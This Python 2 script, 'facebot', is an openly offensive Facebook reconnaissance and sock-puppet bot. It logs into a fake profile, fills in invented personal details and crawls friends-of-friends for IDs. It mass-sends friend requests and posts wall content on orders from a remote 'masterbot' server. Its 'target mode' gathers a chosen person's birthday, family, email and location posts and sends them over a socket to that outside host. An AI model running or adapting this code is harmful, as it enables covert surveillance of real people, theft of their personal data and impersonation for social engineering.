#!/usr/bin/python

'''
Copyright (c) 2014 PuN1sh3r luiguibiker@gmail.com

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
'''


import urllib2,urllib
import cookielib
import pprint
import HTMLParser
import re
import ConfigParser
import MultipartPostHandler
from facepy import GraphAPI
import glob
import argparse
import socket
import time
import random
import json
from bs4 import BeautifulSoup
from fb_token import GetToken


class fbScrapper(HTMLParser.HTMLParser):

    def __init__(self,form_id,type):
        HTMLParser.HTMLParser.__init__(self)
        self.in_form = False
        self.values_login = []
        self.form_id = form_id
        self.type = type


    def handle_starttag(self, tag, attrs):
        tag = tag.lower()
        attrs = dict(attrs)


        if tag == 'form' and self.type in attrs and attrs[self.type] == self.form_id:
            self.in_form = True
        elif self.in_form  and  tag == 'input' and attrs['type'] == 'hidden' :

            if 'value' in attrs:
                if attrs['name'] == 'charset_test':
                    #hack for the unicode error
                    vals = attrs['value']
                    attrs['value'] = vals.encode('utf-8')
                self.values_login.append((attrs['name'],attrs['value']))
        self.get_values()

    def handle_endtag(self, tag):
        if tag.lower() == 'form' and self.in_form:
            self.in_form = False

    def get_values(self):

        return self.values_login


class facebot():

    def __init__(self,username,passwd,host,port):

        self.username = username
        self.datadict = {'collected_data': {}}
        self.passwd = passwd
        self.cookie = []
        self.cj = cookielib.CookieJar()
        self.fbid = " "
        self.facebookID = " "
        self.host = host
        self.port = port
        self.browser = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj),MultipartPostHandler.MultipartPostHandler)
        #self.browser = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj),MultipartPostHandler.MultipartPostHandler,urllib2.HTTPSHandler(debuglevel=2))

    def login(self):
        #completed
        print "logging in to facebook....."
        url = "https://www.facebook.com"
        self.browser.addheaders = [('User-Agent','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:27.0) Gecko/20100101 Firefox/27.0')]
        req = urllib2.install_opener(self.browser)

        try:
            res= urllib2.urlopen(url)

            content_type =  res.info()['Content-Type'].split('; ')
            encoding = 'uft-8'
            fbHtml = fbScrapper("login_form","id")
            if len(content_type) > 1 and content_type[1].startswith('charset'):
                encoding = content_type[1].split('=')[1]

            html = unicode(res.read(),encoding=encoding)
            res.close()

            fbHtml.feed(html)
            data = fbHtml.get_values()
            data.extend([('email',self.username),('pass',self.passwd)])
            form_data = urllib.urlencode(data)
            try:
                res = self.browser.open('https://login.facebook.com/login.php?login_attempt=1',form_data)
                response = res.read()
                self.fbid = re.search('https://www.facebook.com/(.*)\?sk=info',response)
                self.fbid = re.search('https://www.facebook.com/(.*)',self.fbid.group(1))
                self.fbid = re.search('https://www.facebook.com/(.*)',self.fbid.group(1))
            except urllib2.HTTPError,e :
                print "****exception****inside login  error code: %s" % (e.code)
            res.close()
        except urllib2.HTTPError,e :
             print "****exception****inside login  error code: %s" % (e.code)

        #print " server Response Code: %s " % (res.code)


    def crawl_friends(self):
        friendIds = {}
        fid = []
        friendsFid = []
        url = "https://m.facebook.com/%s?v=friends&refid=17" % (self.fbid.group(1))


        print url
        res = self.browser.open(url)
        response = res.read()
        res.close()
        #needs to have at least one friend otherwise it will error
        htmlContent = BeautifulSoup(response)
        for link in htmlContent.find_all('a'):
            fbidtmp = re.search('/(.*)\?fref=fr_tab',link.get('href'))
            if fbidtmp:
                friendsFid.append(fbidtmp.group(1))
        try:
            friendCount  = re.search('Friends\s+\((.*?)\)',response).group(1)
            print friendCount
        except Exception as ex:
            print ex

        if friendCount.find(',') != -1:
            friendCount = re.sub(',','',friendCount)

        if(int(friendCount) > 23):
            for i in range(24,int(friendCount),36):
                url = "https://m.facebook.com/%s?v=friends&mutual&startindex=%srefid=17"  % (self.fbid.group(1),i)
                print url
                 #print "\tcrawling the following url for friends %s  " %(url)
                res = self.browser.open(url)
                response = res.read()
                res.close()
                htmlContent = BeautifulSoup(response)
                for link in htmlContent.find_all('a'):
                    fbidtmp = re.search('/(.*)\?fref=fr_tab',link.get('href'))
                    if fbidtmp:
                        friendsFid.append(fbidtmp.group(1))
            pprint.pprint(len(friendsFid))
            pprint.pprint(friendsFid)
        for f in friendsFid:
            try:
                url = "https://m.facebook.com/"
                res = self.browser.open(url+ f)
                flink = ''
                response = res.read()
                res.close()
                htmlContent = BeautifulSoup(response)
                for link in htmlContent.find_all('a'):
                    try:
                        links = re.search('(.*v=friends.*)',link.get('href'))
                        if links:
                            pprint.pprint(links.group(1))
                            flink =  links.group(1)
                    except Exception as ex:
                        print ex
                try:
                    userid = re.search('/(.*?)\?',flink).group(1)
                except Exception as ex:
                    print "***alert***: Probably this person %s  is not showing his friends or it doesnt have any .... :(" %(f)
                    continue

                res = self.browser.open(url + flink)
                response = res.read()
                res.close()
                fids = re.findall('/a/mobile/friends/add_friend.php\?id=(\d+)',response)
                try:
                    friendCount  = re.search('Friends\s+\((.*?)\)',response).group(1)
                except Exception as ex:
                    print "***alert***: Probably this person %s  is not showing his friends or it doesnt have any .... :(" %(f)
                    continue


                if friendCount.find(',') != -1:
                    friendCount = re.sub(',','',friendCount)

                print "%s has %s friends " % (userid,friendCount)

                if(int(friendCount) > 23):
                    for i in range(24,int(friendCount),36):
                        try:
                            url = "https://m.facebook.com/%s?v=friends&mutual&startindex=%srefid=17"  % (userid,i)
                            res = self.browser.open(url)
                            response = res.read()
                            res.close()
                            try:
                                fids.extend(re.findall('/a/mobile/friends/add_friend.php\?id=(\d+)',response))
                            except Exception as ex:
                                print "exception raised: %s" % (ex)
                            print "\tcrawling the following url for friends: %s  " %(url)
                        except urllib2.HTTPError,e :
                            print e.code

                [fid.append(i) for i in fids if not i in fid]

            except urllib2.HTTPError,e:
                print "http error code:",e.code

        print "*****facebook ids collected  %s sending to masterbot for processing*****" % (len(fid))
        data = json.dumps({"pending_requests":fid})
        listSize = str(len(data))

        if listSize < 2048:
            print "list is less than 1024"
            data = json.dumps({"pending_requests":fid})
            size = json.dumps(len(data))
            self.send_data(size,data)
        else:
            chunks = [fid[i:i+100] for i in range(0,len(fid),100)]
            for chunk in chunks:
                 data = json.dumps({"pending_requests":chunk})
                 size = json.dumps(len(data))
                 self.send_data(size,data)

    def send_data(self,size,data):
        time.sleep(2)
        s = socket.socket()
        s.connect((self.host,int(self.port)))
        s.send(size)
        s.send(data)
        s.close()

    def send_fRequest(self,fbid,s):
    

        print "check pending frequests...."
        try:
            res = self.browser.open("https://m.facebook.com/friends/center/requests/outgoing/")
            response = res.read()
            res.close()
            flag1 = re.search('class="_52lz">(.*?)<',response)
            flag2 = re.findall('subject_id=(.*?)&',response)

            if flag1:
                data = json.dumps({"ok":"ok"})

                pprint.pprint(data)

                print "No friend requests have been sent proceeding.... "
                if fbid:
                    for fid in fbid:
                        url = "https://m.facebook.com/%s" % (fid)
                        print url
                        url2 = "https://m.facebook.com/a/mobile/friends/profile_add_friend.php"

                        res = self.browser.open(url)
                        response = res.read()
                        params = re.search('href="/a/mobile/friends/profile_add_friend.php(.*?)"',response)

                        try:
                            url2  += re.sub('&amp;','&',params.group(1))
                        except AttributeError:
                            print "probably friend does not allow friend requests.... :( "

                        print "sending friend request for fbid %s" % (fid)
                        res = self.browser.open(url2)
                        print " server response code: %s" % (res.code)
                return data
            elif flag2:
                ids_returned = []

                print "there are fbids who have not accepted my friend requests. sending back to masterbot for processing.."

                for i in fbid:
                    if i in flag2:
                        print "true"
                        ids_returned.append(i)
                    else:
                        print "send friend request..."
                        url = "https://m.facebook.com/%s" % (i)
                        url2 = "https://m.facebook.com/a/mobile/friends/profile_add_friend.php"
                        try:
                            res = self.browser.open(url)
                            response = res.read()
                            params = re.search('href="/a/mobile/friends/profile_add_friend.php(.*?)"',response)
                            try:
                                url2  += re.sub('&amp;','&',params.group(1))
                            except AttributeError:
                                print "probably friend does not allow friend requests.... :( "
                            print "sending friend request for fbid %s" % (i)
                            res = self.browser.open(url2)
                        except urllib2.HTTPError,e :
                            print "****exception****inside send_fRequest  error code: %s" % (e.code)

                data = json.dumps({"pending_requests":ids_returned})
                return data
        except urllib2.HTTPError,e :
            print "****exception****inside send_fRequest  error code: %s" % (e.code)

    def write_wall(self,message):
        try:
            res= self.browser.open("https://m.facebook.com/home.php")
            fbHTML = fbScrapper("composer_form","id")
            content_type =  res.info()['Content-Type'].split('; ')
            encoding = 'uft-8'
            if len(content_type) > 1 and content_type[1].startswith('charset'):
                encoding = content_type[1].split('=')[1]
            html = res.read()
            res.close()
            fbHTML.feed(html)
            data = fbHTML.get_values()
            data.extend([('status',message),('update','Share')])
            form_data = urllib.urlencode(data)
            try:
                res = self.browser.open("https://m.facebook.com/a/home.php?refid=7",form_data)
            except urllib2.HTTPError,e :
                print "****exception****inside write_wall post request error code: %s" % (e.code)

        except urllib2.HTTPError,e :
            print "****exception****inside write_wall  looking for compose form  error code: %s" % (e.code)

    def build_profile(self,fields,api_key):
        for field, values in fields.items():
            params = [('save','Save')]
            postUrl = "https://m.facebook.com/a/editprofile.php"

            if field == 'gender':
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                params.extend([('new_info',values),('new_info_arr[0]','0')])
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)

            elif field == "birthday":
                #dont forget to remove the continue line

                #continue
                date = values.split("/")
                month = date[0]
                day = date[1]
                year = date[2]
                params.extend([('month',month),('day',day),('year',year)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)

                self.httpParse("/a/editprofile.php","action",url,params,postUrl)

            elif field == "relationship":
                params.extend([("status", values)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)

            elif field == "interested":
                params.extend([("new_info_arr[0]",values)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)
            elif field == 'current_city' or field == 'hometown':
                params.extend([("add_ids[]",values)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)

            elif field == "languages":
                params.extend([('add_strs[0]',values)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)
            elif field == "religious" or field == "political":
                params.extend([('add_strs[]',values)])
                url = "https://m.facebook.com/editprofile.php?type=basic&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)
            elif field == "quote" or field == "about_me":
                params.extend([('new_info',values)])
                url = "https://m.facebook.com/editprofile.php?type=personal&edit=%s&refid=17" % (field)
                self.httpParse("/a/editprofile.php","action",url,params,postUrl)

            elif field == "photo_location":
                #dont forget to remove the continue

                #two months token
                graph = GraphAPI(api_key)
                pictures = glob.glob(values+ '*.jpg')

                for i in range(1,len(pictures),1):
                    self.pic_upload(pictures[i])

    def pic_upload(self,pic):
        url= "https://m.facebook.com/photos/upload/?album_id=244665622406530&upload_source=album&album_name=me&album_privacy=Public"
        params = {'file1': open(pic,"rb")}
        self.httpParse("multipart/form-data","enctype",url,params,"https://upload.facebook.com/_mupload_/composer/?site_category=m_basic&waterfall_id=a658d92ac0ba52ea168e5a86192357d3&source_loc=album")

    def httpParse(self,form_id,type_param,url,param,postUrl):

        try:

            res = self.browser.open(url)
            html = res.read()
            fbHTML = fbScrapper(form_id,type_param)
            fbHTML.feed(html)
            data = fbHTML.get_values()
            form_data = ''
            dic = {}
            dic.update(param)

            if str(type(param)) ==  "<type 'dict'>":
                for i,j in data:
                    dic[i] = urllib.quote(j,'%')
                res = self.browser.open(postUrl,dic)
            if type(param) is list:
                for p in param:
                    data.extend([p])
                form_data = urllib.urlencode(data)
                res = self.browser.open(postUrl,form_data)

        except urllib2.HTTPError,e :
            print "****exception****inside httpParse  error code: %s" % (e.code)

    def target_mode(self,user,api_key):
        print "collecting data for user %s" % (user)
        url = "https://www.facebook.com/%s" %(user)
        res = self.browser.open(url)
        response = res.read()
        res.close()
        self.facebookID =  re.search('data-profileid="(.*?)"',response).group(1)
        self.datadict['collected_data'] = {self.facebookID: {}}
        aboutme_q = "select work,name,sex,birthday,interests,relationship_status,profile_url,hometown_location,devices,education,contact_email,significant_other_id  from user where uid  = %s"  % (self.facebookID)
        family_q = "SELECT name,relationship FROM family WHERE profile_id = %s"  % (self.facebookID)
        userlocation_q = "SELECT coords,timestamp FROM location_post WHERE author_uid  = %s" % (self.facebookID)
        self.collect_data(aboutme_q,'about_me',api_key)
        self.collect_data(family_q,'family',api_key)
        self.collect_data(userlocation_q,'user_locations',api_key)
        dicSize = json.dumps( self.datadict)
        size = json.dumps(len(dicSize))
        pprint.pprint(dicSize)
        s = socket.socket()
        s.connect((self.host,int(self.port)))
        s.send(size)
        buff = 2048
        i = 0
        j = buff
        while(i < len(dicSize)):
            if j > (len(dicSize)-1):
                j= len(dicSize)
            s.send(dicSize[i:j])
            i += buff
            j += buff
        s.close()
        print "data sent to masterbot please browse to visualizer to see data collected..."

    def collect_data(self,query,section,api_key):
        graph = GraphAPI(api_key)
        data = graph.fql(query)
        '''
        facepy.exceptions.OAuthError: [12] (#12) fql is deprecated for versions v2.1 and higher

        '''
        for k,v in data.items():
            self.datadict['collected_data'][self.facebookID].update({section:[]})
            for i in range(0,len(v),1):
                for k1,v1 in v[i].items():
                    if str(type(v1)) == "<type 'dict'>":
                        for k2,v2 in v1.items():
                            data[k][i][k1][k2] = str(v2)
                self.datadict['collected_data'][self.facebookID][section].append(v[i])


def main():
    fieldDict = {}
    api_key = ''
    masterbot =  ''

    options = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,description=('''Welcome to facebot a facebook recon tool
                .
               _|_     LETS BE FRIENDS.... ?.
        /\/\  (. .)  /
        `||'   |#|
         ||__.-"-"-.___
         `---| . . |--.\
             | : : |  |_|
             `..-..' ( I )
              || ||   | |
              || ||   |_|
             |__|__|  (.)'''))
    options.add_argument('-c','--config',help='read config file',nargs=1,required=True)
    options.add_argument('-b','--build_profile',help='build about me section of profile',action='store_true')
    options.add_argument('-B','--bot_mode',help='enables bot mode. this mode populates random content to the wall/ sends friend requests  in order to impersonate a real user',action='store_true')
    options.add_argument('-t','--test_mode', help='test mode', action='store_true')
    options.add_argument('-cm','--campaign_mode', help='enables  friend campaign mode. bot goes out and gathers friends of friends', action='store_true')
    options.add_argument('-tm','--target_mode',nargs=1, help='enables target mode. give it a friend profile id and the bot will crawl all infoz on his profile ')

    ##options.add_argument('-i','--infiltrate_mode', help=' bot tried to infiltrate  ')
    args = options.parse_args()

    if args.config:
        config = ConfigParser.ConfigParser()

        get_access_token = GetToken(args.config[0])
        token = get_access_token.browser()
        get_access_token.SetLast(token)
        
        config.read(args.config[0])
        sections = config.sections()
        username = config.get('profile-info','username').replace("\"","")
        passwd = config.get('profile-info','password').replace("\"","")
        api_key = config.get('profile-info','api_key').replace("\"","")
        masterbot = config.get('profile-info','masterbot').replace("\"","")
        fields = config.options(sections[0])
        host,port = masterbot.split(":")

        for f in  range(3, len(fields),1):
            fieldDict[fields[f]] = config.get(sections[0],fields[f]).replace("\"","")
        fbot = facebot(username,passwd,host,port)
        fbot.login()
    if args.build_profile:
        print "*****building 'about me' section of profile....*****"
        fbot.build_profile(fieldDict,api_key)
    if args.test_mode:
        print "test mode"

    if args.campaign_mode:
        print "*****performing campaign mode crawling for friends*****"
        fbot.crawl_friends()

    if args.target_mode:
        print "entering target mode "
        targetUser =  args.target_mode[0]
        fbot.target_mode(targetUser,api_key)

    if args.bot_mode:
        print "Entering into bot mode...... (^_^)"
        while 1:
            host,port = masterbot.split(':')
            s = socket.socket()
            randtimeout = random.randint(60,1800)
            print "next update on: %s minutes " % (randtimeout/60)
            s.connect((host,int(port)))
            data = json.dumps({"bot_mode":"ok"})
            size = json.dumps(len(data))
            s.send(size)
            s.send(data)
            receivedData = s.recv(1024)
            instr = receivedData.split("::")
            if(instr[0] == "write_wall"):
                print "\twriting to wall the following content:%s" % (instr[1])
                wallPost = instr[1]
                fbot.write_wall(wallPost)
                data = json.dumps({"ok":"ok"})
                s.send(data)
            elif(instr[0] == "send_frequest"):
                fbid = instr[1].split(",")
                fbid_list = []
                print "Sending friend request to %s: ..............." % (instr[1])
                if fbid:
                    for i in fbid:
                        fbid_list.append(i)
                    pprint.pprint(fbid_list)
                    fbids = fbot.send_fRequest(fbid_list,s)
                    s.send(fbids)
                else:
                    print "no fbids available...."
                    data = json.dumps({"ok":"ok"})
                    s.send(data)
                    continue
            s.close()
            time.sleep(randtimeout)

if __name__ == '__main__':
    main()
